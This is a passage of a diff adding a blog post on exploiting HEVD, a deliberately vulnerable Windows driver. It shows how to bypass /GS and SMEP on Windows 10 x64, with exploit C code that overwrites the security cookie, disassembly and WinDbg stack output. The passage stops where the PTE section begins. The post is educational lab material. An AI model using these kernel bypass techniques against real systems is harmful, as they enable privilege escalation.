@@ -1,0 +1,603 @@
+<!DOCTYPE html>
+<html class="no-js" lang="en">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<title>[HEVD Exploit Series] StackOverflowGS - Logic Security</title>
+	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
+	<meta name="description" content="">
+	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+	<link rel="dns-prefetch" href="//fonts.googleapis.com">
+	<link rel="dns-prefetch" href="//fonts.gstatic.com">
+	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">
+
+	<link rel="stylesheet" href="/css/style.css">
+	
+
+	<link rel="shortcut icon" href="/favicon.ico">
+		
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-CPJWE5ZVG9"></script>
+<script>
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.dataLayer = window.dataLayer || [];
+	function gtag(){dataLayer.push(arguments);}
+	gtag('js', new Date());
+	gtag('config', 'G-CPJWE5ZVG9', { 'anonymize_ip': false });
+}
+</script>
+
+</head>
+<body class="body">
+	<div class="container container--outer">
+		<header class="header">
+	<div class="container header__container">
+		
+	<div class="logo logo--mixed">
+		<a class="logo__link" href="/" title="Logic Security" rel="home">
+			<div class="logo__item logo__imagebox">
+					<img class="logo__img" src="/img/blog_img.png">
+				</div><div class="logo__item logo__text">
+					<div class="logo__title">Logic Security</div>
+					
+				</div>
+		</a>
+	</div>
+		
+<nav class="menu">
+	<button class="menu__btn" aria-haspopup="true" aria-expanded="false" tabindex="0">
+		<span class="menu__btn-title" tabindex="-1">Menu</span>
+	</button>
+	<ul class="menu__list">
+		<li class="menu__item">
+			<a class="menu__link" href="/">
+				
+				<span class="menu__text">Home</span>
+				
+			</a>
+		</li>
+		<li class="menu__item">
+			<a class="menu__link" href="/posts/history_posts/">
+				
+				<span class="menu__text">Collection of Historical Posts</span>
+				
+			</a>
+		</li>
+		
+		
+		
+			
+				<li class="menu__item menu__item--active">
+					<a class="menu__link" href="/posts/hevd_stackoberflowgs/">
+						<span class="menu__text" style="font-weight: bold;">English</span>
+					</a>
+				</li>
+			
+				<li class="menu__item">
+					<a class="menu__link" href="/zh/posts/hevd_stackoberflowgs/">
+						<span class="menu__text" style="">中文</span>
+					</a>
+				</li>
+			
+		
+	</ul>
+</nav>
+
+
+	</div>
+</header>
+		<div class="wrapper flex">
+			<div class="primary">
+			
+<main class="main" role="main">
+	<article class="post">
+		<header class="post__header">
+			<h1 class="post__title">[HEVD Exploit Series] StackOverflowGS</h1>
+			<div class="post__meta meta"><div class="meta__item-author meta__item">
+	<svg class="meta__icon icon icon-author" width="16" height="16" viewBox="0 0 12 16"><path d="M6 1c2.2 0 3.5 2 3.5 4.5C9.5 7 8.9 8.2 8 9c2.9.8 4 2.5 4 5v1H0v-1c0-2.5 1.1-4.2 4-5-.9-.8-1.5-2-1.5-3.5C2.5 3 3.8 1 6 1z"/></svg><span class="meta__text">zoemurmure</span>
+</div>
+<div class="meta__item-datetime meta__item">
+	<svg class="meta__icon icon icon-time" width="16" height="14" viewBox="0 0 30 28"><path d="M15 0C7 0 1 6 1 14s6 14 14 14 14-6 14-14S23 0 15 0zm0 25C9 25 4 20 4 14S9 3 15 3s11 5 11 11-5 11-11 11zm1-18h-2v8.4l6.8 4.4L22 18l-6-3.8V7z"/></svg><time class="meta__text" datetime="2023-01-10T11:18:29&#43;08:00">January 10, 2023</time></div>
+
+
+    <span id="busuanzi_container_page_pv">|<span id="busuanzi_value_page_pv"></span><span>
+    
+        <span class="post-date">3674 words</span>, <span class="more-meta">18 min read</span>
+    
+
+<div class="meta__item-categories meta__item"><svg class="meta__icon icon icon-category" width="16" height="16" viewBox="0 0 16 16"><path d="m7 2l1 2h8v11h-16v-13z"/></svg><span class="meta__text"><a class="meta__link" href="/categories/hevd/" rel="category">HEVD</a>
+	</span>
+</div></div>
+		</header>
+		<div class="content post__content clearfix">
+			<h2 id="0-preface">0. Preface</h2>
+<p><a href="https://github.com/hacksysteam/HackSysExtremeVulnerableDriver">HackSys Extreme Vulnerable Driver (HEVD)</a> is a Windows driver with multiple vulnerabilities developed for learning kernel exploit techniques. This article describes how to bypass a stack overflow vulnerability with <code>/GS</code> protection under a Windows 10 64-bit environment, involving two security mitigations: SMEP and /GS. Only part of the code is posted in this article. For the complete code, please refer to: <a href="https://github.com/zoemurmure/HEVD-Exploit">https://github.com/zoemurmure/HEVD-Exploit</a></p>
+<h2 id="1-target-function">1. Target Function</h2>
+<p>TriggerBufferOverflowStackGS</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">__int64</span> <span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">TriggerBufferOverflowStackGS</span>(<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>src, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span> Size)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> dst[<span style="color:#ae81ff">512</span>]; <span style="color:#75715e">// [rsp+20h] [rbp-238h] BYREF
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">memset</span>(dst, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">sizeof</span>(dst));
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">ProbeForRead</span>(src, <span style="color:#ae81ff">0x200u</span>i64, <span style="color:#ae81ff">1u</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">DbgPrintEx</span>(<span style="color:#ae81ff">0x4Du</span>, <span style="color:#ae81ff">3u</span>, <span style="color:#e6db74">&#34;[+] UserBuffer: 0x%p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, src);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">DbgPrintEx</span>(<span style="color:#ae81ff">0x4Du</span>, <span style="color:#ae81ff">3u</span>, <span style="color:#e6db74">&#34;[+] UserBuffer Size: 0x%X</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, Size);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">DbgPrintEx</span>(<span style="color:#ae81ff">0x4Du</span>, <span style="color:#ae81ff">3u</span>, <span style="color:#e6db74">&#34;[+] KernelBuffer: 0x%p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, dst);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">DbgPrintEx</span>(<span style="color:#ae81ff">0x4Du</span>, <span style="color:#ae81ff">3u</span>, <span style="color:#e6db74">&#34;[+] KernelBuffer Size: 0x%X</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#ae81ff">512</span>i64);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">DbgPrintEx</span>(<span style="color:#ae81ff">0x4Du</span>, <span style="color:#ae81ff">3u</span>, <span style="color:#e6db74">&#34;[+] Triggering Buffer Overflow in Stack (GS)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">memmove</span>(dst, src, Size);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>i64;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h2 id="2-mitigation-gs-protection2">2. Mitigation: /GS Protection^[2]^</h2>
+<h3 id="21-introduction">2.1 Introduction</h3>
+<p>The pseudo-code generated by Hex-Rays (F5) is identical to StackOverflow, but looking directly at the assembly code, we can see two additional blocks of code at the beginning and the end of the function:</p>
+<pre tabindex="0"><code>PAGE:00000001400866E0 48 89 5C 24 18                mov     [rsp+arg_10], rbx
+PAGE:00000001400866E5 56                            push    rsi
+PAGE:00000001400866E6 57                            push    rdi
+PAGE:00000001400866E7 41 54                         push    r12
+PAGE:00000001400866E9 41 56                         push    r14
+PAGE:00000001400866EB 41 57                         push    r15
+PAGE:00000001400866ED 48 81 EC 30 02 00 00          sub     rsp, 230h
+PAGE:00000001400866F4 48 8B 05 05 C9 F7 FF          mov     rax, cs:__security_cookie
+PAGE:00000001400866FB 48 33 C4                      xor     rax, rsp
+PAGE:00000001400866FE 48 89 84 24 20 02 00 00       mov     [rsp+258h+var_38], rax
+
+
+PAGE:00000001400867D6
+PAGE:00000001400867D6                               loc_1400867D6:
+PAGE:00000001400867D6 8B C3                         mov     eax, ebx
+PAGE:00000001400867D8 48 8B 8C 24 20 02 00 00       mov     rcx, [rsp+258h+var_38]
+PAGE:00000001400867E0 48 33 CC                      xor     rcx, rsp        ; StackCookie
+PAGE:00000001400867E3 E8 28 A9 F7 FF                call    __security_check_cookie
+PAGE:00000001400867E8 48 8B 9C 24 70 02 00 00       mov     rbx, [rsp+258h+arg_10]
+PAGE:00000001400867F0 48 81 C4 30 02 00 00          add     rsp, 230h
+PAGE:00000001400867F7 41 5F                         pop     r15
+PAGE:00000001400867F9 41 5E                         pop     r14
+PAGE:00000001400867FB 41 5C                         pop     r12
+PAGE:00000001400867FD 5F                            pop     rdi
+PAGE:00000001400867FE 5E                            pop     rsi
+PAGE:00000001400867FF C3                            retn
+</code></pre><p>The system uses the global <code>security_cookie</code> to XOR the value of <code>rsp</code> and stores it in the stack. The approximate layout of the values in the stack is as follows:</p>
+<pre tabindex="0"><code>+-+-+-+-+-+-+-+-+-+-+-+-+
+|       variables       |
++-+-+-+-+-+-+-+-+-+-+-+-+
+| xored security_cookie |
++-+-+-+-+-+-+-+-+-+-+-+-+
+|    saved registers    |
++-+-+-+-+-+-+-+-+-+-+-+-+
+|    return address     |
++-+-+-+-+-+-+-+-+-+-+-+-+
+| function&#39;s arguments  |
++-+-+-+-+-+-+-+-+-+-+-+-+
+</code></pre><p>Therefore, if we want to modify the return address through stack overflow, the stored <code>xored security_cookie</code> will be modified first, failing the <code>__security_check_cookie</code> validation. The value of <code>security_cookie</code> is randomly generated upon each boot/use. If the random algorithm is secure, attackers cannot predict this value and can no longer exploit the stack overflow vulnerability using previous methods.</p>
+<p>The check in <code>__security_check_cookie</code> validates two parts: first, whether the <code>xored security_cookie</code> matches the original <code>security_cookie</code> after being XORed with <code>RSP</code> again; second, whether the upper 16 bits of this value are 0:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#66d9ef">__cdecl</span> <span style="color:#a6e22e">_security_check_cookie</span>(uintptr_t StackCookie)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">__int64</span> v1; <span style="color:#75715e">// rcx
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( StackCookie <span style="color:#f92672">!=</span> _security_cookie )
+</span></span><span style="display:flex;"><span>ReportFailure:
+</span></span><span style="display:flex;"><span>    _report_gsfailure(StackCookie);
+</span></span><span style="display:flex;"><span>  v1 <span style="color:#f92672">=</span> __ROL8__(StackCookie, <span style="color:#ae81ff">16</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( (_WORD)v1 )
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    StackCookie <span style="color:#f92672">=</span> __ROR8__(v1, <span style="color:#ae81ff">16</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">goto</span> ReportFailure;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>By searching in IDA, we find that <code>security_cookie</code> is generated by the function <code>_security_init_cookie</code> and is ultimately stored at the beginning of the <code>.data</code> section.</p>
+<pre tabindex="0"><code>.data:0000000140003000   ; Segment permissions: Read/Write
+.data:0000000140003000   _data           segment para public &#39;DATA&#39; use64
+.data:0000000140003000                   assume cs:_data
+.data:0000000140003000                   ;org 140003000h
+.data:0000000140003000   ; uintptr_t _security_cookie
+.data:0000000140003000   __security_cookie dq 2B992DDFA232h      ; DATA XREF: __security_check_cookie↑r
+</code></pre><h3 id="22-bypass-methods">2.2 Bypass Methods</h3>
+<ol>
+<li>
+<p><strong>SEH</strong>
+In previously learned user-mode stack overflow exploitation methods, exploiting SEH to achieve code execution was mentioned, which involves modifying the exception handler address in SEH and triggering an exception to control the program&rsquo;s execution flow. However, this method is not feasible here because the testing environment is a 64-bit system. Only 32-bit systems store SEH information on the stack; 64-bit systems store SEH information in a table whose address is saved in the PE header^[3]^. Therefore, SEH cannot be used for exploitation.</p>
+</li>
+<li>
+<p><strong>Guessing the <code>security_cookie</code> Value</strong>
+I decided not to waste time on this under Windows 10.</p>
+</li>
+<li>
+<p><strong>Modifying the <code>cookie</code> value in <code>.data</code> and on the stack</strong>
+To achieve this, an arbitrary write (Write-What-Where) vulnerability is required, and HEVD clearly has this vulnerability in the <code>TriggerArbitraryWrite</code> function. Furthermore, the vulnerable function in this case performs an additional XOR operation on <code>security_cookie</code> with the top of the stack (<code>RSP</code>), so we also need to obtain the stack pointer value, similar to Method 5 below.</p>
+</li>
+<li>
+<p><strong>Overwriting Virtual Function Pointers</strong>
+Conditions: (1) Object or structure pointers exist in function parameters; (2) parameters are placed on the stack. Since the test environment is a 64-bit system where parameters are passed via registers, this is not considered.</p>
+</li>
+<li>
+<p><strong>Reading the cookie value and calculating the <code>xored security_cookie</code> value</strong>
+This requires an arbitrary read vulnerability to read the <code>cookie</code> value, and a way to obtain the value of the <code>RSP</code> register when <code>xored security_cookie</code> is calculated. Article^[1]^ used this method and obtained the <code>RSP</code> value using a method with very strict constraints.</p>
+</li>
+</ol>
+<p>In this study, we will attempt to achieve exploitation using Method 3/5. Method 5 in article^[1]^ was implemented using HEVD&rsquo;s arbitrary write vulnerability to simulate an arbitrary read to read the cookie value. Here, we follow Method 3 to directly modify the cookie value in the <code>.data</code> section using the arbitrary write vulnerability, and then obtain the <code>RSP</code> value by referencing the method from article^[1]^ with <strong>some modifications</strong> (reasons discussed in the detailed analysis below). So far, I haven&rsquo;t found other methods to bypass /GS on x64 systems; if you have any resources, feel free to contact me.</p>
+<h2 id="3-mitigation-smep">3. Mitigation: SMEP</h2>
+<h3 id="31-introduction">3.1 Introduction</h3>
+<p>See <a href="https://mp.weixin.qq.com/s/F9Na71MkWxM-aGcTkj0I3A">https://mp.weixin.qq.com/s/F9Na71MkWxM-aGcTkj0I3A</a></p>
+<h3 id="32-bypass-methods">3.2 Bypass Methods</h3>
+<p>If Hyper-V is enabled on the system, the Hyper Guard feature in Virtualization-Based Security (VBS) will prevent modifications to the <code>CR4</code> register^[5]^, making the method of modifying <code>CR4</code> unusable for exploitation.</p>
+<p>Article^[1]^ uses a new bypass method: modifying the User/Supervisor (U/S) field in the Page Table Entry (PTE) structure^[7]^ of the page where the shellcode is located, setting it to Supervisor state, so that SMEP protection will not be triggered.</p>
+<h2 id="4-implementation">4. Implementation</h2>
+<h3 id="41-required-features">4.1 Required Features</h3>
+<ol>
+<li>Modify the <code>security_cookie</code> value saved in the <code>.data</code> section of <code>HEVD.sys</code>;</li>
+<li>Modify the U/S field value in the PTE of the page where the shellcode resides;</li>
+<li>Obtain the stack pointer value when the vulnerability is triggered.</li>
+</ol>
+<h3 id="42-overall-flow">4.2 Overall Flow</h3>
+<p>Get HEVD.sys base address → Get HEVD.sys <code>.data</code> section address → Modify <code>.data</code> section cookie value → Allocate space for shellcode → Get PTE address of the allocated page → Modify U/S field of PTE → Flush TLB cache → Kernel stack address leak → Set stack anchor → Search anchor → Calculate RSP → Overwrite stack overflow buffer</p>
+<h3 id="43-gs-bypass-method">4.3 /GS Bypass Method</h3>
+<h4 id="431-modify-cookie-value-in-data-section">4.3.1 Modify Cookie Value in <code>.data</code> Section</h4>
+<p>This part is relatively straightforward. The code is shown below (complete code can be found on GitHub):</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span>ULONGLONG <span style="color:#a6e22e">ChangeCookie</span>() {
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">/*
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">	Bypass the /GS defense mechanism by overwriting the cookie value in the .data section.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">	The return value is the overwritten cookie value to facilitate insertion during overflow 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">	and to maintain compatibility with other bypass methods.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">	*/</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// Get HEVD base address
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	ULONGLONG hevdBaseAddr <span style="color:#f92672">=</span> GetDriverBase(<span style="color:#e6db74">&#34;HEVD.sys&#34;</span>);
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (hevdBaseAddr <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>		printf(<span style="color:#e6db74">&#34;[-] Fatal: Error getting base address of HEVD.sys</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// Get .data section base address
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	ULONGLONG dataBase <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>, dataSize <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>	GetSectionAddr(hevdBaseAddr, <span style="color:#e6db74">&#34;.data&#34;</span>, <span style="color:#f92672">&amp;</span>dataBase, <span style="color:#f92672">&amp;</span>dataSize);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">//DWORD hevdDataSecOffset = GetDataSectionOffset(hevdFilePath);
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">if</span> (dataBase <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>		printf(<span style="color:#e6db74">&#34;[-] Fatal: Error getting data section offset</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">//ULONGLONG hevdDataSection = hevdBaseAddr + hevdDataSecOffset;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	printf(<span style="color:#e6db74">&#34;[+] hevdDataSection is 0x%I64x</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, dataBase);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// Modify the cookie value in the .data section
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	ULONGLONG newCookie <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0000414141414141</span>;
+</span></span><span style="display:flex;"><span>	BOOL status <span style="color:#f92672">=</span> WriteData(dataBase, newCookie);
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (status <span style="color:#f92672">==</span> FALSE) {
+</span></span><span style="display:flex;"><span>		printf(<span style="color:#e6db74">&#34;[-] FATAL writing newCookie at hevd data section</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> newCookie;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h4 id="432-obtain-stack-pointer-value">4.3.2 Obtain Stack Pointer Value</h4>
+<p>First, use the <code>NtQuerySystemInformation</code> function to retrieve the <code>PSYSTEM_EXTENDED_PROCESS_INFORMATION</code> of the current process, which contains the <code>StackBase</code> and <code>StackLimit</code> information for each thread in the process. <code>StackBase</code> represents the starting address of the stack, and <code>StackLimit</code> represents the minimum allocatable address within the stack range. Since the stack grows downwards, the value of <code>StackBase</code> is greater than <code>StackLimit</code>. The code for this method is mostly derived from the projects in reference [8] and reference [1], with minor detail modifications.</p>
+<p>After executing the code, we get <code>StackBase = 0xffffed0993bb2000</code> and <code>StackLimit = 0xffffed0993bac000</code>.</p>
+<p>After determining the stack range, we need to find an invariant constant within this range as an anchor, and then use the anchor&rsquo;s address as a base to determine the offset to the top of the stack when the XOR operation occurs. In reference [1], the anchor used is <code>IOCTL_CODE</code>. Let&rsquo;s take a look at the data distribution on the stack when the system executes <code>HEVD!TriggerBufferOverflowStackGS</code>:</p>
+<pre tabindex="0"><code>ffffed09`93bb1798 fffff800746866da HEVD!BufferOverflowStackGSIoctlHandler+0x1a 
+ffffed09`93bb17a0 0000000000000010 
+ffffed09`93bb17a8 0000000000050282 
+ffffed09`93bb17b0 ffffed0993bb17c8 
+ffffed09`93bb17b8 0000000000000018 
+ffffed09`93bb17c0 0000000000000000 
+ffffed09`93bb17c8 fffff80074685223 HEVD!IrpDeviceIoCtlHandler+0x1ab 
+ffffed09`93bb17d0 ffffbc24a1f15c89 
+ffffed09`93bb17d8 0000000000000000 
+ffffed09`93bb17e0 fffff80074688300 HEVD! ?? ::NNGAKEGL::`string&#39;
+ffffed09`93bb17e8 0000000000222007 
+ffffed09`93bb17f0 ffff880648758680 
+ffffed09`93bb17f8 fffff800724316b5 nt!IofCallDriver+0x55
+</code></pre><p>The <code>IOCTL_CODE</code> <code>0000000000222007</code> indeed resides on the stack. This data is pushed onto the stack during the execution of <code>HEVD!IrpDeviceIoCtlHandler</code>. Through debugging, we found that this value appears on the stack because the context is saved when <code>DbgPrintEx</code> is called in <code>HEVD!IrpDeviceIoCtlHandler</code>, which also saves the register holding <code>IOCTL_CODE</code>.</p>
+<p>Of course, the anchor actually used is not <code>0000000000222007</code> but <code>000000000022200B</code>, which is the <code>IOCTL_CODE</code> of the function where the arbitrary write vulnerability resides. This is because during the stack data search, the function containing the stack overflow vulnerability has not been called yet, so its control code will not appear on the stack. To search the stack, the function with the arbitrary write vulnerability must be called, making its control code appear on the stack. Additionally, since:</p>
+<ul>
+<li>Only our exploit program is using the <code>HEVD.sys</code> driver, triggering only one handler at a time;</li>
+<li>The call structures of different handlers are similar, and both call <code>DbgPrintEx</code> beforehand.</li>
+</ul>
+<p>Therefore, the stack data layout remains identical after triggering different handlers, and the <code>IOCTL_CODE</code> of the corresponding handler is always present.</p>
+<p>However, I found the above conditions to be somewhat strict, especially the second point. In a real-world environment, there is no guarantee that <code>IOCTL_CODE</code> will be pushed onto the stack. Thus, I consider using a more common anchor: the return address.</p>
+<p>By examining the call stack, we can see that whenever a driver&rsquo;s handler is triggered, the <code>nt!NtDeviceIoControlFile</code> function is inevitably called, with the return address at <code>nt!NtDeviceIoControlFile+0x56</code>.</p>
+<blockquote>
+<p><strong>Q:</strong> Why wasn&rsquo;t the closer function <code>nt!IofCallDriver</code> chosen?
+<strong>A:</strong> Because we need to search for the <code>call</code> instruction within the function&rsquo;s machine code to determine the return address (instead of hardcoding the offset <code>0x56</code>). In <code>nt!IofCallDriver</code>, there are other <code>0xE8</code> opcodes preceding the target <code>call</code> instruction opcode <code>0xE8</code>, making it inconvenient to search. Therefore, the <code>nt!NtDeviceIoControlFile</code> function was chosen.</p>
+</blockquote>
+<p>This return address can be obtained programmatically in the exploit. Furthermore, I believe that even in real vulnerability environments, a setup similar to condition 1 can be achieved by increasing the execution count or timing the execution. Thus, using the return address as an anchor offers better generality.</p>
+<p>First, verify the feasibility of this method:</p>
+<pre tabindex="0"><code>1: kd&gt; g
+Breakpoint 0 hit
+HEVD!TriggerArbitraryWrite:
+fffff800`74685e74 488bc4          mov     rax,rsp
+0: kd&gt; kb
+ # RetAddr               : Args to Child                                                           : Call Site
+00 fffff800`74685e6f     : ffffed09`92d337e8 00000000`00000001 00000000`00000000 fffff800`7280a621 : HEVD!TriggerArbitraryWrite 
+01 fffff800`746851f3     : ffffbc24`a0997c89 00000000`00000000 fffff800`74688340 00000000`0022200b : HEVD!ArbitraryWriteIoctlHandler+0x17
+02 fffff800`724316b5     : ffff8806`4609f780 00000000`00000002 00000000`00000001 ffff8806`469af190 : HEVD!IrpDeviceIoCtlHandler+0x17b
+03 fffff800`7281d4c8     : ffffed09`92d33b80 ffff8806`4609f780 00000000`00000001 ffff8806`00000000 : nt!IofCallDriver+0x55
+04 fffff800`7281d2c7     : ffff8806`00000000 ffffed09`92d33b80 00000000`00000000 ffffed09`92d33b80 : nt!IopSynchronousServiceTail+0x1a8
+05 fffff800`7281c646     : 00000000`00000000 00000000`00000000 00000000`00000000 00000000`00000000 : nt!IopXxxControlFile+0xc67
+06 fffff800`72611ab5     : 00000000`000000a4 00000000`00000000 00000000`00000000 00000000`00000000 : nt!NtDeviceIoControlFile+0x56
+07 00007ffb`0196d1a4     : 00007ffa`ff01572b 00000000`00000000 00002032`98fecb16 00000000`00000000 : nt!KiSystemServiceCopyEnd+0x25
+08 00007ffa`ff01572b     : 00000000`00000000 00002032`98fecb16 00000000`00000000 00007ffb`018e6777 : 0x00007ffb`0196d1a4
+09 00000000`00000000     : 00002032`98fecb16 00000000`00000000 00007ffb`018e6777 0000005c`ec6ff450 : 0x00007ffa`ff01572b
+0: kd&gt; s rsp L1000 46 c6 81 72 00 f8 ff ff
+ffffed09`92d33a18  46 c6 81 72 00 f8 ff ff-00 00 00 00 00 00 00 00  F..r............
+
+0: kd&gt; g
+Breakpoint 1 hit
+HEVD!TriggerBufferOverflowStackGS:
+fffff800`746866e0 48895c2418      mov     qword ptr [rsp+18h],rbx
+2: kd&gt; kb
+ # RetAddr               : Args to Child                                                           : Call Site
+00 fffff800`746866da     : 00000000`00000010 00000000`00050282 ffffed09`92d337c8 00000000`00000018 : HEVD!TriggerBufferOverflowStackGS [c:\projects\hevd\driver\hevd\bufferoverflowstackgs.c @ 70] 
+01 fffff800`74685223     : ffffbc24`a0997c89 00000000`00000000 fffff800`74688300 00000000`00222007 : HEVD!BufferOverflowStackGSIoctlHandler+0x1a [c:\projects\hevd\driver\hevd\bufferoverflowstackgs.c @ 148] 
+02 fffff800`724316b5     : ffff8806`44eca820 00000000`00000002 00000000`00000001 ffff8806`469b02c0 : HEVD!IrpDeviceIoCtlHandler+0x1ab [c:\projects\hevd\driver\hevd\hacksysextremevulnerabledriver.c @ 282] 
+03 fffff800`7281d4c8     : ffffed09`92d33b80 ffff8806`44eca820 00000000`00000001 ffff8806`00000000 : nt!IofCallDriver+0x55
+04 fffff800`7281d2c7     : ffff8806`00000000 ffffed09`92d33b80 00000000`00000000 ffffed09`92d33b80 : nt!IopSynchronousServiceTail+0x1a8
+05 fffff800`7281c646     : 00000000`00000000 00000000`00000000 00000000`00000000 00000000`00000000 : nt!IopXxxControlFile+0xc67
+06 fffff800`72611ab5     : ffffed09`92d33b80 00000000`00000000 00000000`00000000 00000000`00000000 : nt!NtDeviceIoControlFile+0x56
+07 00007ffb`0196d1a4     : 00007ffa`ff01572b 00000000`00000000 00002032`98feca86 00000000`00000000 : nt!KiSystemServiceCopyEnd+0x25
+08 00007ffa`ff01572b     : 00000000`00000000 00002032`98feca86 00000000`00000000 00007ffb`018e6777 : 0x00007ffb`0196d1a4
+09 00000000`00000000     : 00002032`98feca86 00000000`00000000 00007ffb`018e6777 0000005c`ec6ff4c0 : 0x00007ffa`ff01572b
+2: kd&gt; s rsp L1000 46 c6 81 72 00 f8 ff ff
+ffffed09`92d33a18  46 c6 81 72 00 f8 ff ff-00 00 00 00 00 00 00 00  F..r............
+
+3: kd&gt; p
+HEVD!TriggerBufferOverflowStackGS+0x1b:
+fffff800`746866fb 4833c4          xor     rax,rsp
+3: kd&gt; r rsp
+rsp=ffffed0992d33540
+</code></pre><p>It can be seen that when triggering these two handler functions, the return address used as the anchor is located at the same position in the stack, while the stack pointer for calculating the <code>xored_security_cookie</code> is <code>ffffed0992d33540</code>. The offset between the stack pointer and the anchor is <code>0x4D8</code>. Therefore, we only need to locate the anchor and subtract <code>0x4D8</code> to obtain the value of <code>RSP</code>.</p>
+<h2 id="44-smep-bypass">4.4 SMEP Bypass</h2>
+<h3 id="441-how-to-obtain-the-pte-address">4.4.1 How to Obtain the PTE Address</h3>
+<p>There is a function named <code>MiGetPteAddress</code> in the kernel. Its input parameter is a virtual address, and its return value is the corresponding PTE address. The function is as follows:</p>
